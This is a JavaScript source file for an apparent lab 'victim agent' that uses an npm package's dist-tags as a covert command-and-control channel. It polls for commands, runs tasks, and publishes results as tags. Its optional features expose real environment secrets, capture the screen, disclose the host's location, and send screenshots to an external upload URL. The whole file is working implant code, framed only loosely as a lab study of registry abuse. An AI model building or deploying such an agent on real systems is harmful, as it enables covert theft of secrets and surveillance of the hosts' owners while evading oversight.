// Victim agent: polls dist-tags on a package, executes allowlisted mock tasks
// addressed to it (or to 'all'), and publishes chunked results as dist-tags.
//
// Guarantees:
//  - each command executes AT MOST ONCE (state.lastSeq is persisted before the
//    result is published, and survives restarts via the state file)
//  - malformed tags are logged and skipped, never fatal
//  - registry failures only slow the loop down (exponential backoff); the
//    agent keeps polling
//  - SIGINT/SIGTERM flush state and exit cleanly

import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { pathToFileURL } from 'node:url';
import { loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  decodeCommandTag,
  encodeAnnounceTag,
  encodeResultTags,
  isCommandTag,
} from '../common/protocol.js';
import { RegistryClient } from '../common/registry.js';
import { runTask } from './tasks.js';

const MAX_BACKOFF_SEC = 300;
const COMMAND_BASELINE_VERSION = 1;

// ---------------------------------------------------------------------------
// state file
// ---------------------------------------------------------------------------

export function defaultState() {
  return { agentId: '', lastSeq: {}, commandBaselineVersion: 0 };
}

export function loadState(statePath) {
  try {
    const raw = JSON.parse(fs.readFileSync(statePath, 'utf8'));
    return {
      agentId: typeof raw.agentId === 'string' ? raw.agentId : '',
      lastSeq: raw.lastSeq && typeof raw.lastSeq === 'object' ? raw.lastSeq : {},
      commandBaselineVersion: raw.commandBaselineVersion === COMMAND_BASELINE_VERSION
        ? COMMAND_BASELINE_VERSION
        : 0,
    };
  } catch (err) {
    if (err?.code === 'ENOENT') return defaultState();
    throw new Error(`cannot load state file "${statePath}": ${err.message}`, { cause: err });
  }
}

export function saveState(statePath, state) {
  const absolute = path.resolve(statePath);
  const tmp = `${absolute}.${process.pid}.tmp`;
  fs.mkdirSync(path.dirname(absolute), { recursive: true, mode: 0o700 });
  try {
    fs.writeFileSync(tmp, JSON.stringify(state, null, 2), { flag: 'wx', mode: 0o600 });
    if (process.platform !== 'win32') fs.chmodSync(tmp, 0o600);
    fs.renameSync(tmp, absolute);
  } finally {
    fs.rmSync(tmp, { force: true });
  }
}

/** Reset command progress when the configured identity changes. */
export function applyAgentIdentity(state, agentId) {
  if (state.agentId === agentId) return state;
  return {
    ...state,
    agentId,
    lastSeq: {},
    commandBaselineVersion: 0,
  };
}

// ---------------------------------------------------------------------------
// command selection (pure, testable)
// ---------------------------------------------------------------------------

/**
 * Pick the commands that should be executed from a dist-tag map.
 * Returns them sorted by sequence number. Malformed tags are reported in
 * `skipped` instead of throwing.
 */
export function selectCommands(distTags, state, agentId) {
  const commands = [];
  const skipped = [];
  const selectedSequences = new Set();
  for (const name of Object.keys(distTags)) {
    if (!isCommandTag(name)) continue;
    let cmd;
    try {
      cmd = decodeCommandTag(name);
    } catch (err) {
      skipped.push({ tag: name, reason: err.message });
      continue;
    }
    if (cmd.agentId !== agentId && cmd.agentId !== 'all') continue;
    const last = state.lastSeq[cmd.agentId] ?? 0;
    if (cmd.seq <= last) continue; // already processed (dedup)
    const key = `${cmd.agentId}:${cmd.seq}`;
    if (selectedSequences.has(key)) {
      skipped.push({ tag: name, reason: `duplicate command sequence ${key}` });
      continue;
    }
    selectedSequences.add(key);
    commands.push({ tag: name, ...cmd });
  }
  commands.sort((a, b) => a.seq - b.seq);
  return { commands, skipped };
}

/** One deterministic discovery tag per agent, reused across every restart. */
export function encodeStableAnnouncementTag(agentId) {
  return encodeAnnounceTag(agentId, { v: 1 });
}

/**
 * On first run after installation or upgrade, ignore command tags that were
 * already present. The returned state is a new object; completed baselines are
 * returned unchanged so restarts can process commands queued while offline.
 */
export function createCommandBaseline(distTags, state, agentId) {
  if (state.commandBaselineVersion === COMMAND_BASELINE_VERSION) return state;
  const lastSeq = { ...state.lastSeq };
  for (const name of Object.keys(distTags)) {
    if (!isCommandTag(name)) continue;
    try {
      const command = decodeCommandTag(name);
      if (command.agentId !== agentId && command.agentId !== 'all') continue;
      lastSeq[command.agentId] = Math.max(lastSeq[command.agentId] ?? 0, command.seq);
    } catch {
      // Malformed tags are ignored during baselining and reported by later polls.
    }
  }
  return { ...state, lastSeq, commandBaselineVersion: COMMAND_BASELINE_VERSION };
}

/**
 * Publish all chunk tags of one result, then verify they are actually visible.
 * A registry can silently drop a dist-tag write that returned success when
 * another writer updates the package document concurrently (observed on
 * registry.npmjs.org). Re-publish any missing chunks, bounded by `rounds`.
 * @param {object} client RegistryClient (or fake with setDistTag/getDistTags)
 * @param {string[]} tags chunk tag names to publish
 * @param {object} [deps]
 * @param {object} [deps.logger]
 * @param {number} [deps.rounds] total publish attempts (initial + repairs)
 */
export async function publishResultTags(client, tags, { logger, rounds = 3 } = {}) {
  let pending = tags;
  for (let attempt = 1; attempt <= rounds; attempt++) {
    if (attempt > 1) {
      logger?.warn(`re-publishing ${pending.length}/${tags.length} lost result chunk(s) (attempt ${attempt}/${rounds})`);
    }
    for (const tag of pending) {
      await client.setDistTag(tag, PINNED_VERSION);
    }
    const current = await client.getDistTags();
    pending = tags.filter((t) => !(t in current));
    if (pending.length === 0) return;
  }
  throw new Error(`${pending.length}/${tags.length} result chunk(s) lost after ${rounds} publish attempts`);
}

// ---------------------------------------------------------------------------
// one poll cycle (testable with a fake client)
// ---------------------------------------------------------------------------

/**
 * @param {object} deps
 * @param {Record<string,string>} deps.distTags current dist-tag map
 * @param {object} deps.state agent state (mutated)
 * @param {string} deps.agentId this agent's id
 * @param {object} deps.client RegistryClient (or fake with setDistTag)
 * @param {object} deps.logger
 * @param {Function} [deps.save] persist callback, called after each state change
 * @param {object} [deps.limits] task limits, e.g. { maxFileBytes, revealEnv }
 * @returns {Promise<{executed: number, resultsPublished: number, skipped: number}>}
 */
export async function processDistTags({
  distTags,
  state,
  agentId,
  client,
  logger,
  save,
  limits = {},
}) {
  const { commands, skipped } = selectCommands(distTags, state, agentId);
  for (const s of skipped) {
    logger.warn(`skipping malformed tag "${s.tag}": ${s.reason}`);
  }

  let resultsPublished = 0;
  let executed = 0;
  for (const cmd of commands) {
    logger.info(`executing seq ${cmd.seq} (target ${cmd.agentId}): op=${cmd.payload.op}`);
    executed++;
    const result = runTask(cmd.payload.op, cmd.payload.args ?? {}, limits);
    const resultPayload = {
      seq: cmd.seq,
      op: cmd.payload.op,
      ok: result.ok,
      output: result.output,
      error: result.error,
      ...(result.file ? { file: result.file } : {}),
      ts: Date.now(),
    };

    // Mark processed BEFORE publishing: if the publish fails we would rather
    // lose a result than execute a command twice.
    state.lastSeq[cmd.agentId] = cmd.seq;
    if (save) save();

    try {
      const tags = encodeResultTags(agentId, cmd.seq, resultPayload);
      await publishResultTags(client, tags, { logger });
      resultsPublished++;
      logger.info(
        `result for seq ${cmd.seq} published as ${tags.length} tag(s) (ok=${result.ok})`,
      );
    } catch (err) {
      logger.error(`failed to publish result for seq ${cmd.seq}: ${err.message}`);
    }

    if (cmd.agentId !== 'all') {
      try {
        await client.deleteDistTag(cmd.tag);
      } catch (err) {
        logger.warn(`failed to delete processed command "${cmd.tag}": ${err.message}`);
      }
    }
  }

  return { executed, resultsPublished, skipped: skipped.length };
}

// ---------------------------------------------------------------------------
// main loop
// ---------------------------------------------------------------------------

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: cfg.logLevel,
    logFile: cfg.logFile,
  });
  const statePath = cfg.stateFile || 'victim-state.json';
  let state = loadState(statePath);
  const save = () => saveState(statePath, state);

  if (cfg.agentId) {
    state = applyAgentIdentity(state, cfg.agentId);
  }
  if (!state.agentId) {
    state = applyAgentIdentity(state, 'a' + crypto.randomBytes(4).toString('hex'));
    logger.info(`generated new agentId: ${state.agentId}`);
  }
  save();

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    timeoutMs: cfg.requestTimeoutMs,
    maxRetries: cfg.maxRetries,
    baseDelayMs: cfg.retryBaseDelayMs,
    logger,
  });

  logger.info(`victim agent ${state.agentId} starting`);
  logger.info(`registry=${cfg.registryUrl} package=${cfg.packageName} poll=${cfg.pollIntervalSec}s`);
  logger.info(`cwd=${process.cwd()} maxFileBytes=${cfg.maxFileBytes}`);
  if (cfg.revealEnv) {
    logger.warn('revealEnv is ON — the env task returns real values; secrets may cross the channel');
  }
  if (cfg.enableScreenshot) {
    logger.warn('enableScreenshot is ON — the screenshot task can capture everything on screen');
  }
  if (cfg.enableGeolocate) {
    logger.warn('enableGeolocate is ON — the geolocate task discloses this host\'s location over the channel');
  }
  if (cfg.uploadUrl) {
    logger.warn(`uploadUrl is set (${cfg.uploadUrl}) — screenshot bytes leave the lab to an external service`);
  }
  if (!cfg.token) {
    logger.warn('NPM_C2_TOKEN is not set — result publishing will fail with 401');
  }

  let running = true;
  let sigCount = 0;
  const shutdown = (signal) => {
    sigCount++;
    if (sigCount > 1) {
      logger.warn(`received ${signal} again — forcing exit`);
      process.exit(1);
    }
    logger.info(`received ${signal}, shutting down (press Ctrl-C again to force)`);
    running = false;
  };
  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);

  let announced = false;
  let consecutiveFailures = 0;
  while (running) {
    let delaySec = cfg.pollIntervalSec;
    try {
      const distTags = await client.getDistTags();
      consecutiveFailures = 0;
      if (state.commandBaselineVersion !== COMMAND_BASELINE_VERSION) {
        state = createCommandBaseline(distTags, state, state.agentId);
        save();
        logger.info('existing commands baselined; only later commands will execute');
      }
      if (!announced) {
        try {
          await client.setDistTag(encodeStableAnnouncementTag(state.agentId), PINNED_VERSION);
          announced = true;
          logger.info('stable announce tag published');
        } catch (err) {
          logger.warn(`failed to publish stable announce tag: ${err.message}`);
        }
      }
      const stats = await processDistTags({
        distTags,
        state,
        agentId: state.agentId,
        client,
        logger,
        save,
        limits: {
          maxFileBytes: cfg.maxFileBytes,
          revealEnv: cfg.revealEnv,
          enableFunOps: cfg.enableFunOps,
          enableScreenshot: cfg.enableScreenshot,
          screenshotMaxWidth: cfg.screenshotMaxWidth,
          uploadUrl: cfg.uploadUrl,
          enableGeolocate: cfg.enableGeolocate,
          geolocateServiceUrl: cfg.geolocateServiceUrl,
          geolocateServiceKey: cfg.geolocateServiceKey,
        },
      });
      if (stats.executed > 0 || stats.skipped > 0) {
        logger.info('cycle summary', stats);
      }
    } catch (err) {
      consecutiveFailures++;
      delaySec = Math.min(cfg.pollIntervalSec * 2 ** consecutiveFailures, MAX_BACKOFF_SEC);
      logger.error(
        `poll cycle failed (${consecutiveFailures} consecutive): ${err.message} — retrying in ${delaySec}s`,
      );
    }
    // sleep in small slices so SIGINT exits promptly
    for (let slept = 0; running && slept < delaySec * 1000; slept += 200) {
      await sleep(Math.min(200, delaySec * 1000 - slept));
    }
  }

  save();
  logger.close();
  process.exit(0);
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((err) => {
    console.error(`fatal: ${err.message}`);
    process.exit(1);
  });
}
